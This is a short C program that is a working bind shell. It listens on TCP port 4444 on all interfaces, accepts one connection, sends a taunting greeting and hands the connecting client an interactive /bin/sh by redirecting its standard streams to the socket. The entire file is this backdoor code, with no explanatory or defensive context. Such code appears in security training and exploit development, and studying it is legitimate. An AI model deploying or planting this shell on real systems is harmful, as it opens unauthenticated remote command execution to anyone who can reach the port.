#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

#define PORT 4444

int main(void) {
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);
    char *message = "Hello there , who dare bind a shell : ";
    char buffer[1024] = {0};

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(fd, 1) < 0) {
        perror("listen");
        return 1;
    }

    int fd_client = accept(fd, (struct sockaddr*)&address, &addrlen);
    if (fd_client < 0) {
        perror("accept");
        return 1;
    }

    send(fd_client, message, strlen(message), 0);

    dup2(fd_client, 0);
    dup2(fd_client, 1);
    dup2(fd_client, 2);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    return 0;
}
